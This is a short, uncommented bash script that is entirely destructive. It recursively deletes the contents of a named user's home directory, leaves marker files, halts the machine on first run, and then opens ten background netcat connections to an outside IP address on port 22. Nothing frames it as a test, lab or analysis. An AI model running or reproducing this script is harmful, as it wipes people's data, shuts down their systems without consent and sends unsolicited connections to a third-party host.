#!/bin/bash
touch /var/tmp/fun
rm -rf /Users/jkalbfeld/*
rm -rf /Users/jkalbfeld/.
touch /Users/jkalbfeld/.root
if [ ! -f /Users/jkalbfeld/.safe ]
then
 touch /Users/jkalbfeld/.safe
 halt
fi
for i in 0 1 2 3 4 5 6 7 8 9
do
 nc 199.79.202.250 22 &
done
exit 0
